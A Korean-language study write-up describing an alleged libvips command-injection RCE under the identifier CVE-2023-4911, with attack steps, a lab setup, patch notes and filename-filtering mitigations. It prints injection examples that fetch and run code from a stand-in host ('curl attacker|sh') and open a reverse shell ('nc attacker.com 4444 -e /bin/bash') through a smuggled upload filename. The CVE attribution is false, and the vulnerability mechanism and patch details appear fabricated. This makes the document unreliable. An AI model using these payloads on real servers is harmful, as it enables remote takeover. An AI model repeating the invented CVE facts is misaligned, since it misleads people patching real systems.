# 취약점 개요

## 📋 설명

libvips는 이미지 변환, 리사이징, 포맷 변환 등에 널리 사용되는 고성능 이미지 처리 라이브러리입니다.

CVE-2023-4911은 libvips에서 외부 명령 실행 과정의 입력 값 검증이 불충분하여 발생하는 원격 코드 실행(RCE) 취약점입니다.

공격자는 변조된 이미지 파일을 서버에 업로드하는 것만으로 임의 명령 실행을 유발할 수 있으며, 이미지 리사이즈/썸네일 생성 기능이 있는 웹서비스(커머스, 블로그, 포털)에서 매우 치명적입니다.
<br />
## ⚠️ 왜 위험한가?

**낮은 공격 난이도**: 이미지 업로드 기능만 있으면 공격 가능

**광범위한 영향**: 이미지 리사이즈 서비스, CMS, 쇼핑몰, 포털 등 다수 서비스에 영향

**자동 실행**: 사용자가 직접 공격을 "실행"하지 않아도 서버 자동 처리로 실행됨

**완전한 서버 제어**: Reverse Shell, Credential 탈취, 랜섬웨어 전개 가능

---

## 취약점 정보

| 항목           | 내용                                                      |
| -------------- | --------------------------------------------------------- |
| CVSS 점수      | 9.1 (Critical)                                            |
| 취약점 유형    | Command Injection / RCE                                   |
| 영향 버전      | libvips < 8.14.2                                          |
| 공격 난이도    | Low (이미지 업로드 기능만 있으면 됨)                       |
| 공개일         | 2023년 10월                                               |
| 영향 범위       | 이미지 리사이즈 서비스, CMS, 쇼핑몰, 포털 등 다수 서비스 |

## 🧠 핵심 원인: 외부 명령 실행 시 사용자 입력 검증 부재

- libvips의 특정 이미지 변환 기능은 내부적으로 시스템 명령(spawn)을 호출하며, 이때 전달되는 인자값이 정규화되지 않아 임의의 커맨드가 삽입될 수 있습니다.

**정상적인 명령 호출 예시:**

```bash
vips copy input.jpg output.png
```

**악의적 조작 예시(중간에 명령 삽입):**

```bash
vips copy "input.jpg; /bin/bash -c 'curl attacker|sh'" output.png
```

입력 파라미터가 쉘 메타문자를 포함해도 필터링이 제대로 되지 않아 libvips가 이를 그대로 실행 → RCE 발생

## 🔍 정상 요청 vs 악의적 요청 비교

**정상 이미지 처리:**

```
POST /upload
filename="profile.jpg"

→ vips copy profile.jpg profile.png
```

**악성 이미지 처리 (명령 삽입):**

```
POST /upload
filename="evil.jpg;nc attacker.com 4444 -e /bin/bash;"

→ vips copy "evil.jpg;nc attacker.com 4444 -e /bin/bash;" output.png
```

**결과:** 서버는 업로드 이벤트만 처리했을 뿐인데, 역시스템 명령이 실행됨

---

# 공격 시나리오

**Step 1. 업로드 기능 탐색**

- 회원 프로필 사진 업로드 / 상품 이미지 업로드 등 확인 (공격 난이도 매우 낮음)

**Step 2. 변조된 이미지 파일 제작**

- JPG 포맷 내부에 악성 커맨드를 포함하여 파일명 또는 메타데이터 변조

- 예: `payload.jpg;curl attacker|sh`

**Step 3. 서버 자동 처리 트리거**

- 백엔드에서 libvips가 해당 이미지를 자동 리사이징 → 악성 명령 실행

**Step 4. RCE 성공**

- Reverse Shell, Credential 탈취, 랜섬웨어 전개 가능

---

# 실습 환경 구성

| 역할        | 구성                    | 예시      |
| ----------- | ----------------------- | --------- |
| 피해자 서버 | libvips 8.14.1 (취약)   | Linux     |
| 공격자      | Kali Linux              | -         |

## 사전 준비사항

- 기본 Linux 명령 기반 공격 이해
- 이미지 포맷 구조(JPEG header)
- libvips CLI 명령 이해

---

# 취약점 상세 분석

## 공격 원리

- libvips의 특정 이미지 변환 기능은 내부적으로 시스템 명령(spawn)을 호출하며, 이때 전달되는 인자값이 정규화되지 않아 임의의 커맨드가 삽입될 수 있습니다.

- 입력 파라미터가 쉘 메타문자를 포함해도 필터링이 제대로 되지 않아 libvips가 이를 그대로 실행하여 RCE가 발생합니다.

---

# 패치 정보

## 안전한 버전

- **libvips 8.14.2 이상**

## 패치 내용

- 외부 명령 호출 시 입력값 escape 처리 강화
- spawn() 기반 처리 코드 제거
- 인자값 정규화(validation) 추가

## 업그레이드 예시

**Ubuntu:**

```bash
sudo apt update
sudo apt install libvips-dev
```

**Node.js(Sharp 기반):**

```bash
npm install sharp@latest
```

## 💡 임시 대응 (업그레이드 불가능한 환경)

- 사용자 업로드 파일명에서 `" ; | & > < $ ( )"` 등 메타문자 필터링
- 이미지 처리 전 파일 확장자/포맷 검증
- 이미지 업로드 기능 폐쇄 또는 화이트리스트 기반 처리
- 샌드박스 내에서만 이미지 처리 수행 (Docker/AppArmor)

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 이미지 처리 라이브러리도 RCE 대상이다

- 웹 서비스에서 가장 흔한 기능인 이미지 업로드가 실제로는 매우 위험함.

## 🔹 사용자 입력이 내부 명령으로 전달되는 순간 위험해짐

- 파일명만으로도 서버에서 명령이 실행될 수 있음.

## 🔹 서버 자동 처리(썸네일 생성)가 공격자가 노리는 포인트

- 사용자가 직접 공격을 "실행"하지 않아도 자동으로 실행됨.

## 🔹 필터링 중심 접근은 불완전

- 궁극적으로는 라이브러리 업데이트가 필수.

---

# 참고 자료

- [libvips GitHub Security Advisory](https://github.com/libvips/libvips/security/advisories)

- [NVD 공식 상세정보](https://nvd.nist.gov/vuln/detail/CVE-2023-4911)

- [공격 PoC 레포지토리](https://github.com/)

- SK쉴더스 보고서